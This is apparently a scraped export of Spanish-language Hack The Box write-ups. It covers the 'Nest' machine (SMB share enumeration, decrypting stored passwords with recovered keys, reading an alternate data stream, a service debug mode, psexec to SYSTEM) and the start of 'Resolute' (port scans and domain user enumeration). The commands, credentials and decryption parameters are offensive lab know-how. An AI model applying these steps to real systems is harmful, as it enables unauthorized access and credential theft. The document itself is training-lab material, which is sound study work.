6449704 blocks available smb: \\\u0026gt; cd IT smb: \\IT\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\IT\\* smb: \\IT\\\u0026gt; cd .. smb: \\\u0026gt; cd Production dsmb: \\Production\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\Production\\* smb: \\Production\\\u0026gt; cd .. smb: \\\u0026gt; cd Reports smb: \\Reports\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\Reports\\* smb: \\Reports\\\u0026gt; cd .. smb: \\\u0026gt; cd Shared dsmb: \\Shared\\\u0026gt; dir . D 0 Wed Aug 7 13:07:51 2019 .. D 0 Wed Aug 7 13:07:51 2019 Maintenance D 0 Wed Aug 7 13:07:32 2019 Templates D 0 Wed Aug 7 13:08:07 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\\u0026gt; cd Maintenance smb: \\Shared\\Maintenance\\\u0026gt; dir . D 0 Wed Aug 7 13:07:32 2019 .. D 0 Wed Aug 7 13:07:32 2019 Maintenance Alerts.txt A 48 Mon Aug 5 17:01:44 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Maintenance\\\u0026gt; get \u0026#34;Maintenance Alerts.txt\u0026#34; getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\Shared\\Maintenance\\\u0026gt; cd ..\\Templates smb: \\Shared\\Templates\\\u0026gt; dir . D 0 Wed Aug 7 13:08:07 2019 .. D 0 Wed Aug 7 13:08:07 2019 HR D 0 Wed Aug 7 13:08:01 2019 Marketing D 0 Wed Aug 7 13:08:06 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\\u0026gt; dir HR HR D 0 Wed Aug 7 13:08:01 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\\u0026gt; cd HR smb: \\Shared\\Templates\\HR\\\u0026gt; dir . D 0 Wed Aug 7 13:08:01 2019 .. D 0 Wed Aug 7 13:08:01 2019 Welcome Email.txt A 425 Wed Aug 7 16:55:36 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\HR\\\u0026gt; get \u0026#39;Welcome Email.txt\u0026#39; NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\Shared\\Templates\\HR\\\u0026#39;Welcome smb: \\Shared\\Templates\\HR\\\u0026gt; get \u0026#34;Welcome Email.txt\u0026#34; getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (0.6 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\Shared\\Templates\\HR\\\u0026gt; cd ..\\Marketing smb: \\Shared\\Templates\\Marketing\\\u0026gt; dir . D 0 Wed Aug 7 13:08:06 2019 .. D 0 Wed Aug 7 13:08:06 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\Marketing\\\u0026gt; Los archivos que encontramos son archivos de texto que contienen notas, en una de ellas encontramos las credenciales de uno de los usuarios de la maquina.\nMaintenance Alerts.txt:\nThere is currently no scheduled maintenance work Welcome Email.txt:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 We would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt; You will find your home folder in the following location: \\\\HTB-NEST\\Users\\\u0026lt;USERNAME\u0026gt; If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR USER - C.Smith Utilizamos las credenciales para enumerar los SHARENAME que estan disponibles en la maquina, en un directorio encontramos un archivo XML RU_config.xml el cual contiene credenciales especificamente de C.Smith.\n1 2 3 4 5 6 7 8 9 10 \\\\\\\\10.10.10.178\\\\Data smb: \\IT\\Configs\\\u0026gt; cd \u0026#34;RU Scanner\u0026#34; smb: \\IT\\Configs\\RU Scanner\\\u0026gt; dir . D 0 Wed Aug 7 14:01:13 2019 .. D 0 Wed Aug 7 14:01:13 2019 RU_config.xml A 270 Thu Aug 8 13:49:37 2019 10485247 blocks of size 4096. 6449668 blocks available smb: \\IT\\Configs\\RU Scanner\\\u0026gt; get RU_config.xml getting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as RU_config.xml (0.2 KiloBytes/sec) (average 3.4 KiloBytes/sec) RU_config.xml:\n1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ConfigFile xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;389\u0026lt;/Port\u0026gt; \u0026lt;Username\u0026gt;c.smith\u0026lt;/Username\u0026gt; \u0026lt;Password\u0026gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026lt;/Password\u0026gt; \u0026lt;/ConfigFile\u0026gt; Tambien encontramos un proyecto que lleva el nombre de RU, para encontrar el directorio de Carl, enumeramos el SHARENAME Data en el cual encontramos un archivo xml en donde se describe un \u0026ldquo;archivo temporal\u0026rdquo; en \\Secure$\\IT\\Carl\\Temp.txt el cual no existe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; dir . D 0 Wed Aug 7 13:31:37 2019 .. D 0 Wed Aug 7 13:31:37 2019 config.xml A 6451 Wed Aug 7 17:01:25 2019 shortcuts.xml A 2108 Wed Aug 7 13:30:27 2019 10485247 blocks of size 4096. 6449680 blocks available smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; get config.xml getting file \\IT\\Configs\\NotepadPlusPlus\\config.xml of size 6451 as config.xml (7.7 KiloBytes/sec) (average 7.7 KiloBytes/sec) smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; exit root@aoiri:~/htb/nest# tail config.xml \u0026lt;Find name=\u0026#34;redeem on\u0026#34; /\u0026gt; \u0026lt;Find name=\u0026#34;192\u0026#34; /\u0026gt; \u0026lt;Replace name=\u0026#34;C_addEvent\u0026#34; /\u0026gt; \u0026lt;/FindHistory\u0026gt; \u0026lt;History nbMaxFile=\u0026#34;15\u0026#34; inSubMenu=\u0026#34;no\u0026#34; customLength=\u0026#34;-1\u0026#34;\u0026gt; \u0026lt;File filename=\u0026#34;C:\\windows\\System32\\drivers\\etc\\hosts\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026#34; /\u0026gt; \u0026lt;/History\u0026gt; \u0026lt;/NotepadPlus\u0026gt; root@aoiri:~/htb/nest# Dicho Directorio nos llevo a encontrar el Proyecto RU.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; dir . D 0 Tue Aug 6 08:47:41 2019 .. D 0 Tue Aug 6 08:47:41 2019 RU D 0 Fri Aug 9 09:36:45 2019 10485247 blocks of size 4096. 6449639 blocks available smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; mask \u0026#34;\u0026#34; smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; recurse ON smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; prompt OFF smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; mget * getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\ConfigFile.vb of size 772 as ConfigFile.vb (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Module1.vb of size 279 as Module1.vb (0.8 KiloBytes/sec) (average 1.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.Designer.vb of size 441 as Application.Designer.vb (1.2 KiloBytes/sec) (average 1.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.myapp of size 481 as Application.myapp (1.5 KiloBytes/sec) (average 1.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\AssemblyInfo.vb of size 1163 as AssemblyInfo.vb (1.9 KiloBytes/sec) (average 1.6 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.Designer.vb of size 2776 as Resources.Designer.vb (7.8 KiloBytes/sec) (average 2.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.resx of size 5612 as Resources.resx (9.3 KiloBytes/sec) (average 3.9 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.Designer.vb of size 2989 as Settings.Designer.vb (8.6 KiloBytes/sec) (average 4.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.settings of size 279 as Settings.settings (0.8 KiloBytes/sec) (average 4.1 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj of size 4828 as RU Scanner.vbproj (13.3 KiloBytes/sec) (average 4.9 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj.user of size 143 as RU Scanner.vbproj.user (0.3 KiloBytes/sec) (average 4.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\SsoIntegration.vb of size 133 as SsoIntegration.vb (0.4 KiloBytes/sec) (average 4.1 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Utils.vb of size 4888 as Utils.vb (7.5 KiloBytes/sec) (average 4.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner.sln of size 871 as RUScanner.sln (2.3 KiloBytes/sec) (average 4.4 KiloBytes/sec) PROJECT VB Descargamos el proyecto, analizamos el codigo y vemos que es un proyecto que encripta una contraseña o una string desde un archivo de XML y tambien lo desencripta. Modificamos y ejecutamos el proyecto con el archivo RU_config.xml para obtener la contraseña de C.Smith.\nFuncion DecryptString:\n1 2 Console.WriteLine(\u0026#34;Decrypted Text: \u0026#34; +Decrypt(EncryptedString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256)) Threading.Thread.Sleep(50000) Credenciales:\nC.Smit:xRxRxPANCAK3SxRxRx Utilizamos la contraseña en SAMBA (Users) y logramos leer nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 root@aoiri:~/htb/nest/tmp# smbclient \\\\\\\\10.10.10.178\\\\Users -U C.Smith Enter WORKGROUP\\C.Smith\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sat Jan 25 17:04:21 2020 .. D 0 Sat Jan 25 17:04:21 2020 Administrator D 0 Fri Aug 9 09:08:23 2019 C.Smith D 0 Sun Jan 26 01:21:44 2020 L.Frost D 0 Thu Aug 8 11:03:01 2019 R.Thompson D 0 Thu Aug 8 11:02:50 2019 TempUser D 0 Wed Aug 7 16:55:56 2019 10485247 blocks of size 4096. 6449275 blocks available smb: \\\u0026gt; cd C.Smith smb: \\C.Smith\\\u0026gt; dir . D 0 Sun Jan 26 01:21:44 2020 .. D 0 Sun Jan 26 01:21:44 2020 HQK Reporting D 0 Thu Aug 8 17:06:17 2019 user.txt A 32 Thu Aug 8 17:05:24 2019 10485247 blocks of size 4096. 6449275 blocks available smb: \\C.Smith\\\u0026gt; get user.txt getting file \\C.Smith\\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\C.Smith\\\u0026gt; exit root@aoiri:~/htb/nest/tmp# cat user.txt cf71b25404be5d84fd827e05f426e987 root@aoiri:~/htb/nest/tmp# PRIVILEGE ESCALATION Dentro de la carpeta principal de C.Smith encontramos dos archivos el primero parecia estar vacio Debug Mode Password.txt y el segundo HqkLdap.exe un ejecutable. Al obtener más informacion de este archivo encontramos que tiene Alternative Data Streams como en la maquina Dropzone de HackTheBox, obtenemos el archivo y encontramos lo que parece ser una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 root@aoiri:~/htb# smbclient \\\\\\\\10.10.10.178\\\\Users -U C.Smith #xRxRxPANCAK3SxRxRx Enter WORKGROUP\\C.Smith\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sat Jan 25 17:04:21 2020 .. D 0 Sat Jan 25 17:04:21 2020 Administrator D 0 Fri Aug 9 09:08:23 2019 C.Smith D 0 Sun Jan 26 01:21:44 2020 L.Frost D 0 Thu Aug 8 11:03:01 2019 R.Thompson D 0 Thu Aug 8 11:02:50 2019 TempUser D 0 Wed Aug 7 16:55:56 2019 10485247 blocks of size 4096. 6449700 blocks available smb: \\\u0026gt; cd \u0026#34;C.Smith\\HQK Reporting\\\u0026#34; smb: \\C.Smith\\HQK Reporting\\\u0026gt; dir . D 0 Thu Aug 8 17:06:17 2019 .. D 0 Thu Aug 8 17:06:17 2019 AD Integration Module D 0 Fri Aug 9 06:18:42 2019 Debug Mode Password.txt A 0 Thu Aug 8 17:08:17 2019 HQK_Config_Backup.xml A 249 Thu Aug 8 17:09:05 2019 10485247 blocks of size 4096. 6449700 blocks available smb: \\C.Smith\\HQK Reporting\\\u0026gt; allinfo \u0026#34;Debug Mode Password.txt\u0026#34; altname: DEBUGM~1.TXT create_time: Thu Aug 8 05:06:12 PM 2019 CST access_time: Thu Aug 8 05:06:12 PM 2019 CST write_time: Thu Aug 8 05:08:17 PM 2019 CST change_time: Thu Aug 8 05:08:17 PM 2019 CST attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\\u0026gt; get \u0026#34;Debug Mode Password.txt:Password:$DATA\u0026#34; getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\C.Smith\\HQK Reporting\\\u0026gt; exit root@aoiri:~/htb# cat Debug\\ Mode\\ Password.txt\\:Password\\:\\$DATA WBQ201953D8w root@aoiri:~/htb# Data Streams - SAMBA\nHQK Reporting Service En el segundo puerto utilizamos telnet para conectarnos, y por lo que parece es un servicio en el cual podemos ejecutar ciertos comandos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@aoiri:~/htb/nest# rlwrap telnet 10.10.10.178 4386 Trying 10.10.10.178... Connected to 10.10.10.178. Escape character is \u0026#39;^]\u0026#39;. HQK Reporting Service V1.2 \u0026gt;HELP This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; \u0026gt; Enumeramos los querys que existen en el servicio y por lo que parece el servicio utiliza carpetas como directorio y ejecuta los querys (archivos) que existen el directorio, por lo que nos podemos mover a traves de C:\\ como si fuera una consola pero con distintos comandos.\nUno de los comandos interesante es el DEBUG ya que al utilizar este comando junto con la contraseña, tenemos nuevos comandos los cuales podemos ejecutar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026gt;DEBUG WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available \u0026gt;HELP This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; SERVICE SESSION SHOWQUERY \u0026lt;Query_ID\u0026gt; \u0026gt;SETDIR .. Current directory set to HQK \u0026gt;LIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [DIR] ALL QUERIES [DIR] LDAP [DIR] Logs [1] HqkSvc.exe [2] HqkSvc.InstallState [3] HQK_Config.xml Current Directory: HQK \u0026gt;SHOWQUERY 3 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ServiceSettings xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;4386\u0026lt;/Port\u0026gt; \u0026lt;DebugPassword\u0026gt;WBQ201953D8w\u0026lt;/DebugPassword\u0026gt; \u0026lt;QueryDirectory\u0026gt;C:\\Program Files\\HQK\\ALL QUERIES\u0026lt;/QueryDirectory\u0026gt; \u0026lt;/ServiceSettings\u0026gt; \u0026gt; Dentro de los directorios encontramos la contraseña del usuario Administrator.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Current Directory: HQK \u0026gt;SETDIR LDAP Current directory set to LDAP \u0026gt;LIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [1] HqkLdap.exe [2] Ldap.conf Current Directory: LDAP \u0026gt;SHOWQUERY 2 Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= \u0026gt; DNSPY Utilizamos DNSPY para desensamblar el archivo ejecutable que encontramos, al analizar el codigo vemos que utiliza la misma encriptacion que el proyecto \u0026lsquo;RU Scanner\u0026rsquo; con los mismos parametros.\nUtilizamos el projecto \u0026lsquo;RU Scanner\u0026rsquo; con los parametros de encriptacion pasando la contraseña de administrador.\n1 2 Console.Write(\u0026#34;Decrypted: \u0026#34;+Decrypt(\u0026#34;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\u0026#34;, \u0026#34;667912\u0026#34;, \u0026#34;1313Rf99\u0026#34;, 3, \u0026#34;1L1SA61493DRV53Z\u0026#34;, 256)) Threading.Thread.Sleep(50000) VB:\nCredenciales:\nAdministrator:XtH4nkS4Pl4y1nGX PSEXEC Utilizamos psexec.py de impacket para obtener nuestra shell y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@aoiri:~/htb/nest# /root/tools/impacket/examples/psexec.py \u0026#39;Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178\u0026#39; Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file GHkDSZLH.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service QTBl on 10.10.10.178..... [*] Starting service QTBl..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt 6594c2e[ ... ]94b878c41 C:\\Windows\\system32\u0026gt; ","description":"Tras enumerar SAMBA encontramos credenciales para un segundo recurso donde descubrimos una contraseña encriptada y proyecto de Visual Studio, con este ultimo logramos desencriptar la contraseña. Con ello ingresamos a un nuevo recurso donde encontramos Alternative Data Streams en un ejecutable, dentro de este encontramos una contraseña que utilizamos en un servicio de reporteria, utilizamos DNSPY en un ejecutable para leer el codigo fuente lo que nos permitio conseguir la contraseña del administrador y obtener acceso privilegiado utilizando psexec de Impacket.","id":135,"section":"posts","tags":["smbclient","HQK Reporting"],"title":"Hack The Box - Nest","uri":"https://sckull.github.io/posts/nest/"},{"content":"\rResolute con SO Windows expone Samba y Ldap, lo que nos dio informacion para ingresar por WinRM. Encontramos credenciales en un archivo para tener acceso a un segundo usuario. Encontramos que el usuario petenece al grupo DnsAdmins, configuramos dnscmd con un payload de metasploit para conseguir una shell como administrador.\nInformacion de la Maquina Nombre Resolute OS Windows Puntos 30 Dificultad Media IP 10.10.10.169 Maker egre55\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.8, 7.7, 5.9, 4.1, 2.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 7, 3, 7, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 masscan -p1-65535,U:1-65535 10.10.10.169 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-03 21:06:25 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 3269/tcp on 10.10.10.169 Discovered open port 5985/tcp on 10.10.10.169 Discovered open port 464/tcp on 10.10.10.169 Discovered open port 65511/udp on 10.10.10.169 Discovered open port 593/tcp on 10.10.10.169 Discovered open port 49665/tcp on 10.10.10.169 Discovered open port 3268/tcp on 10.10.10.169 Discovered open port 49915/tcp on 10.10.10.169 Discovered open port 389/tcp on 10.10.10.169 Discovered open port 88/tcp on 10.10.10.169 Discovered open port 49667/tcp on 10.10.10.169 Discovered open port 56647/udp on 10.10.10.169 Discovered open port 53/tcp on 10.10.10.169 # Nmap 7.80 scan initiated Fri Jan 3 15:11:12 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.169 Warning: 10.10.10.169 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.169 Host is up (0.14s latency). Not shown: 63791 closed ports, 1719 filtered ports PORT STATE SERVICE VERSION 53/tcp open tcpwrapped 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-03 21:24:08Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 9389/tcp open adws? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open unknown 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49915/tcp open msrpc Microsoft Windows RPC 52015/tcp open tcpwrapped 52105/tcp open tcpwrapped Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h48m08s, deviation: 4h37m09s, median: 8m07s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2020-01-03T13:25:11-08:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-01-03T21:25:14 |_ start_date: 2020-01-03T20:29:32 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 3 15:18:57 2020 -- 1 IP address (1 host up) scanned in 464.61 seconds ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 ========================== | Target Information | ========================== Target ........... 10.10.10.169 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.169 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ============================================ | Nbtstat Information for 10.10.10.169 | ============================================ Looking up status of 10.10.10.169 No reply from 10.10.10.169 ===================================== | Session Check on 10.10.10.169 | ===================================== [+] Server 10.10.10.169 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; [+] Got domain/workgroup name: =========================================== | Getting domain SID for 10.10.10.169 | =========================================== Domain Name: MEGABANK Domain Sid: S-1-5-21-1392959593-3013219662-3596683436 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.169 | ====================================== [+] Got OS info for 10.10.10.169 from smbclient: [+] Got OS info for 10.10.10.169 from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.169 | ============================= index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail\tName: (null)\tDesc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator\tName: (null)\tDesc: Built-in account for administering the computer/domain index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela\tName: (null)\tDesc: (null) index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette\tName: (null)\tDesc: (null) index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika\tName: (null)\tDesc: (null) index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire\tName: (null)\tDesc: (null) index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude\tName: (null)\tDesc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount\tName: (null)\tDesc: A user account managed by the system. index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia\tName: (null)\tDesc: (null) index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred\tName: (null)\tDesc: (null) index: 0xfbd RID: 0x1f5 acb: 